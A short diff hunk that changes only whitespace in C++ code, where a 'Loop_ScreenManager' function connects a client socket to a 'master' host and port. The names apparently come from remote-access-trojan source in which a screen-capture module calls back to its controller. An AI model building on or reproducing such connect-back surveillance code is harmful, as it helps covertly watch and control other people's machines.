@@ -40,7 +40,7 @@ extern bool g_bSignalHook;
 
 DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
 {
-	CClientSocket	socketClient;
+	CClientSocket socketClient;
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
 		return -1;
 	
